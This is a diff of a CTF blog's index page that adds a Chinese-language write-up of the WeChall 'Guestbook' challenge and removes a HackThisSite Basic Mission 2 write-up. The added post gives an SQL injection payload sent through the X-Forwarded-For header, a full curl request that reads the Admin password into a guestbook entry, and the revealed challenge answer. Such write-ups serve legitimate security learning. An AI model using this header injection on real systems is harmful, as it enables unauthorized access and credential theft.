@@ -235,7 +235,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">313</span>
+          <span class="site-state-item-count">314</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -376,6 +376,124 @@ p.spoiler {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-the-guestbook/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-the-guestbook/" class="post-title-link" itemprop="url">WeChall - The Guestbook</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-06-09 16:39:10 / Modified: 16:50:57" itemprop="dateCreated datePublished" datetime="2026-06-09T16:39:10+08:00">2026-06-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-the-guestbook/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-the-guestbook/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<p>一个带源码的 guestbook 挑战。页面会把留言、session id、时间和访问者
+IP 写入数据库；目标是找到 Admin 的密码。</p>
+<p>关键点不在留言内容，而在 IP 来源：程序信任
+<code>X-Forwarded-For</code>，并把它当作字符串直接拼进
+<code>INSERT</code>。</p>
+<h3 id="solution">Solution</h3>
+<p>源码里的 IP 获取逻辑大致是：优先读取
+<code>$_SERVER['HTTP_X_FORWARDED_FOR']</code>，否则才使用真实远端地址。随后写入
+guestbook：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT INTO</span> gbook_book <span class="keyword">VALUES</span>(<span class="string">&#x27;$sessid&#x27;</span>, <span class="number">0</span>, $<span class="type">time</span>, <span class="string">&#x27;$ip&#x27;</span>, <span class="string">&#x27;$message&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p><code>$message</code> 会被正常处理，但 <code>$ip</code>
+没有转义。因为 <code>$ip</code> 被包在单引号里，可以用
+<code>X-Forwarded-For</code> 关闭当前字符串，再补齐后面的
+<code>VALUES</code> 字段。</p>
+<p>先构造一个不依赖盲注的 payload：把 Admin 密码查出来，直接写到
+guestbook 的 message 字段里。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&#x27;, (SELECT gbu_password FROM gbook_user WHERE gbu_name=&#x27;Admin&#x27;))#</span><br></pre></td></tr></table></figure>
+<p>代入后 SQL 变成：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT INTO</span> gbook_book <span class="keyword">VALUES</span>(</span><br><span class="line">  <span class="string">&#x27;$sessid&#x27;</span>,</span><br><span class="line">  <span class="number">0</span>,</span><br><span class="line">  $<span class="type">time</span>,</span><br><span class="line">  <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">  (<span class="keyword">SELECT</span> gbu_password <span class="keyword">FROM</span> gbook_user <span class="keyword">WHERE</span> gbu_name<span class="operator">=</span><span class="string">&#x27;Admin&#x27;</span>))#<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">  &#x27;</span>$message<span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>
+<p><code>#</code> 注释掉原本剩下的
+<code>', '$message')</code>，于是子查询结果会作为留言内容落库。</p>
+<p>实际提交时需要带登录 cookie，并先从页面取当前 CSRF token：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s -b <span class="string">&#x27;WC=...&#x27;</span> \</span><br><span class="line">  -H <span class="string">&quot;X-Forwarded-For: 127.0.0.1&#x27;,(SELECT gbu_password FROM gbook_user WHERE gbu_name=&#x27;Admin&#x27;))#&quot;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&#x27;message=test&#x27;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&#x27;sign=Sign Guestbook&#x27;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&#x27;gwf3_csrf=TOKEN&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;https://www.wechall.net/en/challenge/guestbook/index.php&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>再刷新 guestbook，刚插入的记录会显示 Admin 密码。</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">TheBrownFoxAndTheLazyDog</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1448,112 +1566,6 @@ file, but there were deeper problems than that.</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.hackthissite.org/missions/basic/3/password.php</span><br></pre></td></tr></table></figure>
 <p>页面会直接返回密码内容。</p>
 <span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">e656d2bd</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/HackThisSite/hackthissite-basic-02/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/HackThisSite/hackthissite-basic-02/" class="post-title-link" itemprop="url">HackThisSite - Basic Mission 2</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-06-08 21:35:15 / Modified: 21:35:16" itemprop="dateCreated datePublished" datetime="2026-06-08T21:35:15+08:00">2026-06-08</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/HackThisSite/hackthissite-basic-02/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/HackThisSite/hackthissite-basic-02/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<blockquote>
-<p>Network Security Sam set up a password protection script. He made it
-load the real password from an unencrypted text file and compare it to
-the password the user enters. However, he neglected to upload the
-password file...</p>
-<p>Sam
-设置了一个密码保护脚本，从一个未加密的文本文件中加载真实密码进行比对。然而他忘了上传密码文件。</p>
-</blockquote>
-<h3 id="solution">Solution</h3>
-<p>这道题考察的是逻辑思维。脚本从文件加载密码来比对用户输入。如果密码文件不存在，脚本就无法加载任何内容来比对。</p>
-<p>当你提交一个空密码时，脚本试图将空字符串与一个不存在的文件内容比对——两者都是空值，所以比对通过。</p>
-<p>直接在密码框中什么都不输入，点击 submit 即可。</p>
-<p>核心知识点：如果密码文件缺失，认证系统可能默认接受任何输入（甚至空输入）。实际部署中应该对文件缺失的情况做防御性处理。</p>
 
       
     </div>
